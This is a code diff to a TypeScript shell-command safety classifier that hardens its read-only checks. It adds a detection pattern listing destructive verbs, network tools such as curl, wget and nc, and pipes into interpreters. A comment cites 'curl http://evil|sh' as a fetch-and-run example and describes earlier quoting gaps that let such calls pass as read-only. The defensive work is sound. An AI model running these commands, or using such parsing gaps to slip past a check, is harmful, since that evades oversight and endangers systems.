@@ -4301,6 +4301,17 @@ const INLINE_DESTRUCTIVE_RE = new RegExp([
   /open\s*\(\s*['"]\|/,
 ].map((r) => (typeof r === 'string' ? r : r.source)).join('|'))
 
+/**
+ * f-round-18 K1: a literal argv string is NOT read-only when it is a shell
+ * program body. `sh -c "touch /tmp/p"`, `rm -rf …`, `curl http://evil|sh`
+ * write / delete / connect without any `>`/`>>`/`$(` marker, so the old
+ * redirect-only check treated them as benign literals and J1 spread / J3
+ * bind-chain calls sailed through as read-only. Destructive verbs, network
+ * verbs, pipes into an interpreter and backticks all deny read-only status.
+ */
+const SHELL_BODY_DANGER_RE =
+  /\b(?:rm|touch|mkdir|rmdir|truncate|unlink|dd|tee|mkfifo|mknod|install|ln|mv|cp|chmod|chown|chflags)\b|\b(?:curl|wget|nc|ncat|ssh|scp|sftp|telnet|ftp)\b|\|\s*(?:sh|bash|dash|zsh|node|python|perl|ruby)\b|`[^`]*`/
+
 /** Extract the quoted code body after -e/-E, allowing an immediately-adjacent
  *  quote (`perl -e'...'`) that extractFlagArgument skips. */
 function extractInlineCodeBody(trimmed: string, flags: string[]): string | null {
@@ -4602,6 +4613,7 @@ const FIND_FIND_DESTRUCTIVE_RE = new RegExp([
   /\bqx\b/,
   /`[^`]*`/,
 ].map((r) => (typeof r === 'string' ? r : r.source)).join('|'))
+
 
 /** Perl `-M`/`-m` and ruby `-r` network modules carried on the load flag rather
  *  than inside the extracted code body; a match fails closed on egress. */const FIND_NET_PERL_FLAG = /(?:^|[\s=])-[mM]\s*=?\s*['"]?[A-Za-z0-9:]+['"]?/g
@@ -5487,6 +5499,12 @@ function splitTopLevel(s: string, sep: string): string[] {
 }
 
 function f6JsDanger(code: string): string | null {
+  // f-round-18 K2: shell `'\''` (close/escaped-quote/reopen) is how a quote is
+  // embedded inside a single-quoted shell string (`node -e '…'\''…'`). Treating
+  // it as a JS escape made protectedRegions mark half of the payload as a
+  // string literal and the inline-JS net went blind on the FE face; normalize
+  // the idiom to a double quote before scanning so the body is visible again.
+  code = code.replace(/'\\''/g, '"')
   const stripped = stripJsComments(code)
   const pr = protectedRegions(stripped)
   const outside = (idx: number) => !pr.unterminated && pr.regions.some(([s, e]) => idx >= s && idx < e)
@@ -6090,6 +6108,10 @@ function f6JsDanger(code: string): string | null {
       // only when they carry no shell redirect / command substitution
       const lit = x.slice(1, -1)
       if (/>>|>|\$\s*\(/.test(lit)) return false
+      // f-round-18 K1: the string may itself be a shell program body
+      // (`sh -c "touch /tmp/p"`) — destructive / network verbs, pipes into an
+      // interpreter and backticks deny read-only status even without `>`.
+      if (SHELL_BODY_DANGER_RE.test(lit)) return false
       return true
     }
     if (/^\[[\s\S]*\]$/.test(x)) {
@@ -6344,7 +6366,7 @@ function f6JsDanger(code: string): string | null {
       if (j1Src.size > 0) {
         const j1SrcRe = `(?:${[...j1Src].map(esc).join('|')})`
         const taintedKeys = new Set<string>()
-        const storeRe = new RegExp(`(?:Object\\.\\s*defineProperty\\s*\\([^,]+,\\s*["'\x60]([^"'\x60]+)["'\x60]\\s*,\\s*\\{[\\s\\S]*?${j1SrcRe}[\\s\\S]*?\\}|Object\\.\\s*assign\\s*\\([^,]+,\\s*\\{[^}]*["'\x60]?([A-Za-z_$][\\w$]*)["'\x60]?\\s*:\\s*${j1SrcRe}\\b|Reflect\\.\\s*set\\s*\\([^,]+,\\s*["'\x60]([^"'\x60]+)["'\x60]\\s*,\\s*${j1SrcRe}\\b|\\{\\s*\\.\\.\\.[^}]*,\\s*["'\x60]?([A-Za-z_$][\\w$]*)["'\x60]?\\s*:\\s*${j1SrcRe}\\b)`, 'g')
+        const storeRe = new RegExp(`(?:Object\\.\\s*defineProperty\\s*\\([^,]+,\\s*["'\x60]([^"'\x60]+)["'\x60]\\s*,\\s*\\{[\\s\\S]*?${j1SrcRe}[\\s\\S]*?\\}|Object\\.\\s*assign\\s*\\([^,]+,\\s*\\{[^}]*["'\x60]?([A-Za-z_$][\\w$]*)["'\x60]?\\s*:\\s*${j1SrcRe}\\b|Reflect\\.\\s*set\\s*\\([^,]+,\\s*["'\x60]([^"'\x60]+)["'\x60]\\s*,\\s*${j1SrcRe}\\b|\\{[^{}]*["'\x60]?([A-Za-z_$][\\w$]*)["'\x60]?\\s*:\\s*${j1SrcRe}\\b[^{}]*\\})`, 'g')
         for (const m of stripped.matchAll(storeRe)) {
           const key = m[1] ?? m[2] ?? m[3] ?? m[4]
           if (key) taintedKeys.add(key)
@@ -6892,14 +6914,43 @@ function f6PyThreat(code: string): string | null {
   return null
 }
 
-/** Extract the quoted code after -c/-e/-E/--eval from an action substring. */
+/** Extract the quoted code after -c/-e/-E/--eval from an action substring.
+ *  f-round-18 K2: shell-quote aware — the standard bash idiom for embedding a
+ *  literal quote inside a single-quoted string is `'\''` (close, escaped
+ *  quote, reopen); the old `'([^']*)'` branch truncated at the first `'` and
+ *  the whole inline-JS net went blind on the FE face. The scanner below
+ *  consumes `'\''` (and keeps the double-quote branch escape-aware). */
 function findInlineCode(action: string): string | null {
-  // H2: php uses `-r`/`-R` for inline code (ruby -e, perl -e/-E, python -c,
-  // node -e/--eval). F1-b: `"…\"…\"…"` keeps escaped quotes INSIDE the body
-  // (a double-quoted -c/-e body may embed escaped quotes) — extract with an
-  // escape-aware double-quote branch.
-  const m = action.match(/-(?:c|e|E|r|R|eval)\s*(?:'([^']*)'|"((?:[^"\\\n]|\\.)*)")/)
-  return m ? (m[1] ?? m[2] ?? null) : null
+  const m = action.match(/-(?:c|e|E|r|R|eval)\s*(?:'|")/)
+  if (!m) return null
+  const q = m[0].endsWith('"') ? '"' : "'"
+  const start = m.index + m[0].length
+  let out = ''
+  if (q === '"') {
+    // escape-aware double-quote branch (existing F1-b contract)
+    for (let i = start; i < action.length; i++) {
+      const ch = action[i]
+      if (ch === '\\' && i + 1 < action.length) { out += action[i + 1]; i++; continue }
+      if (ch === '"') break
+      if (ch === '\n') return null
+      out += ch
+    }
+    return out
+  }
+  // single-quote branch: `'\''` inside a single-quoted body embeds a quote
+  for (let i = start; i < action.length; i++) {
+    const ch = action[i]
+    if (ch === "'") {
+      if (action[i + 1] === '\\' && action[i + 2] === "'" && action[i + 3] === "'") {
+        out += "'"
+        i += 3
+        continue
+      }
+      break
+    }
+    out += ch
+  }
+  return out
 }
 
 /**
